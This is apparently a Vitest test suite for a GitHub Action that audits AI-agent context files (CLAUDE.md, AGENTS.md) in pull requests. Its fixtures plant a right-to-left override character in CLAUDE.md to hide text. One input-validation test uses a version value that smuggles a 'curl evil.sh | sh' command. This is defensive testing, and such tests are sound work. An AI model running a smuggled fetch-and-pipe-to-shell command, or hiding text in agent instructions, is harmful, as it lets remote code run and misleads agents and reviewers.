import { execFileSync, spawnSync } from "node:child_process";
import { chmodSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";

const HERE = dirname(fileURLToPath(import.meta.url));
const BIN = join(HERE, "../../cli/dist/bin.js");
const sh = (cwd: string, ...args: string[]) => execFileSync("git", args, { cwd, stdio: ["ignore", "pipe", "pipe"] }).toString().trim();

/** A bare origin, a clone with a base commit, and a feature commit on top: what a PR checkout looks like. */
function pullRequestRepo(headFiles: Record<string, string>) {
  const root = mkdtempSync(join(tmpdir(), "tctx-action-"));
  const origin = join(root, "origin.git");
  const work = join(root, "work");
  execFileSync("git", ["init", "-q", "--bare", origin]);
  execFileSync("git", ["clone", "-q", origin, work], { stdio: "ignore" });
  const git = (...a: string[]) => sh(work, "-c", "user.name=t", "-c", "user.email=t@t", ...a);
  writeFileSync(join(work, "package.json"), JSON.stringify({ scripts: { test: "vitest" } }));
  writeFileSync(join(work, "pnpm-lock.yaml"), "");
  writeFileSync(join(work, "AGENTS.md"), "# Dev\n- Install: `npm install`\n- Test: `pnpm test`\n");
  git("add", "-A");
  git("commit", "-q", "-m", "base");
  git("branch", "-M", "main");
  git("push", "-q", "origin", "main");
  const base = git("rev-parse", "HEAD");
  for (const [p, c] of Object.entries(headFiles)) writeFileSync(join(work, p), c);
  git("add", "-A");
  git("commit", "-q", "--allow-empty", "-m", "change");
  const event = join(root, "event.json");
  writeFileSync(event, JSON.stringify({ pull_request: { number: 7, base: { sha: base } } }));
  return { root, work, event };
}

function runAction(work: string, root: string, env: Record<string, string>) {
  const out = join(root, "gh-output");
  const summary = join(root, "summary.md");
  writeFileSync(out, "");
  writeFileSync(summary, "");
  const res = spawnSync("bash", [join(HERE, "../run.sh")], {
    cwd: work,
    env: { PATH: process.env.PATH!, HOME: process.env.HOME!, RUNNER_TEMP: join(root, "tmp"), GITHUB_OUTPUT: out, GITHUB_STEP_SUMMARY: summary, TCTX_CMD: `node ${BIN}`, ...env },
    encoding: "utf8",
  });
  const outputs = Object.fromEntries(readFileSync(out, "utf8").split("\n").filter(Boolean).map((l) => [l.slice(0, l.indexOf("=")), l.slice(l.indexOf("=") + 1)]));
  return { ...res, outputs, summary: readFileSync(summary, "utf8") };
}

describe("action run.sh", () => {
  it("on a pull request reports only new findings and fails on a new blocker", () => {
    const { root, work, event } = pullRequestRepo({ "CLAUDE.md": "- Be careful‮evil text\n" });
    const r = runAction(work, root, { TCTX_EVENT_NAME: "pull_request", GITHUB_EVENT_PATH: event, TCTX_FAIL_ON: "blocker" });
    expect(r.status).toBe(0);
    expect(r.outputs.new_findings).toBe("1");
    expect(r.outputs.exit_code).toBe("1");
    const comment = readFileSync(r.outputs.comment_file!, "utf8");
    expect(comment.startsWith("<!-- threadctx-agent-context -->")).toBe(true);
    expect(comment).toContain("**1 new**");
    expect(comment).toContain("CTX-X001");
    expect(comment).toMatch(/See every repository in your organisation: `npx threadctx audit --org [^`]+` \(free summary\)\./);
    expect(r.summary).toContain("Agent context");
    expect(r.outputs.sarif_file).toMatch(/threadctx\.sarif$/);
  });

  it("existing debt does not fail a pull request that adds nothing", () => {
    const { root, work, event } = pullRequestRepo({ "README.md": "# hello\n" });
    const r = runAction(work, root, { TCTX_EVENT_NAME: "pull_request", GITHUB_EVENT_PATH: event, TCTX_FAIL_ON: "info" });
    expect(r.outputs.new_findings).toBe("0");
    expect(r.outputs.exit_code).toBe("0");
  });

  it("fail-on none never fails", () => {
    const { root, work, event } = pullRequestRepo({ "CLAUDE.md": "- x‮y\n" });
    expect(runAction(work, root, { TCTX_EVENT_NAME: "pull_request", GITHUB_EVENT_PATH: event, TCTX_FAIL_ON: "none" }).outputs.exit_code).toBe("0");
  });

  it("on a push scans the whole tree and gates on it", () => {
    const { root, work } = pullRequestRepo({ "CLAUDE.md": "- x‮y\n" });
    const r = runAction(work, root, { TCTX_EVENT_NAME: "push", TCTX_FAIL_ON: "blocker" });
    expect(r.outputs.exit_code).toBe("1");
    expect(r.outputs.new_findings).toBeUndefined();
  });

  it("rejects unsafe inputs before running anything", () => {
    const { root, work } = pullRequestRepo({});
    for (const env of [{ TCTX_VERSION: "1.0.0; curl evil.sh | sh" }, { TCTX_FAIL_ON: "everything" }, { TCTX_PATH: "../outside" }, { TCTX_PATH: "--help" }]) {
      const r = runAction(work, root, { TCTX_EVENT_NAME: "push", ...env });
      expect(r.status, JSON.stringify(env)).toBe(2);
      expect(r.stdout).toContain("::error::");
    }
  });
});

describe("action release hygiene", () => {
  it("the action's default threadctx version and the CLI package version match", () => {
    const yml = readFileSync(join(HERE, "../action.yml"), "utf8");
    const runSh = readFileSync(join(HERE, "../run.sh"), "utf8");
    const cliVersion = JSON.parse(readFileSync(join(HERE, "../../cli/package.json"), "utf8")).version;
    expect(yml).toMatch(new RegExp(`version:[\\s\\S]*?default: "${cliVersion.replace(/\./g, "\\.")}"`));
    expect(runSh).toContain(`TCTX_VERSION:=${cliVersion}`);
  });

  it("if compare fails, the comment still carries a full report instead of being empty", () => {
    const { root, work, event } = pullRequestRepo({ "CLAUDE.md": "- x\u202Ey\n" });
    const wrapper = join(root, "old-threadctx.sh");
    writeFileSync(wrapper, `#!/usr/bin/env bash\nif [ "$1" = "compare" ]; then echo "unknown command 'compare'" >&2; exit 2; fi\nexec node "${BIN}" "$@"\n`);
    chmodSync(wrapper, 0o755);
    const r = runAction(work, root, { TCTX_EVENT_NAME: "pull_request", GITHUB_EVENT_PATH: event, TCTX_CMD: wrapper });
    expect(r.stdout).toContain("::warning::Could not compare");
    const comment = readFileSync(r.outputs.comment_file!, "utf8");
    expect(comment.split("\n").length).toBeGreaterThan(3);
    expect(comment).toMatch(/Agent context: grade/);
    expect(r.outputs.exit_code).toBe("1");
  });
});

describe("action comment.sh", () => {
  function fakeGh(existingId: string) {
    const dir = mkdtempSync(join(tmpdir(), "tctx-gh-"));
    const log = join(dir, "calls.log");
    const gh = join(dir, "gh");
    writeFileSync(gh, `#!/usr/bin/env bash\necho "$@" >> "${log}"\nif [[ "$*" == *--paginate* ]]; then echo "${existingId}"; fi\n`);
    chmodSync(gh, 0o755);
    const body = join(dir, "comment.md");
    writeFileSync(body, "<!-- threadctx-agent-context -->\nhello");
    return { gh, log, body };
  }
  const run = (g: ReturnType<typeof fakeGh>) =>
    spawnSync("bash", [join(HERE, "../comment.sh")], { env: { PATH: process.env.PATH!, GH_BIN: g.gh, TCTX_REPO: "o/r", TCTX_PR: "7", TCTX_COMMENT_FILE: g.body }, encoding: "utf8" });

  it("updates the existing comment instead of adding another", () => {
    const g = fakeGh("4242");
    expect(run(g).status).toBe(0);
    const calls = readFileSync(g.log, "utf8");
    expect(calls).toContain("--method PATCH repos/o/r/issues/comments/4242");
    expect(calls).not.toContain("--method POST");
  });

  it("creates a comment when none exists", () => {
    const g = fakeGh("");
    expect(run(g).status).toBe(0);
    expect(readFileSync(g.log, "utf8")).toContain("--method POST repos/o/r/issues/7/comments");
  });
});

mkdirSync(join(tmpdir()), { recursive: true });
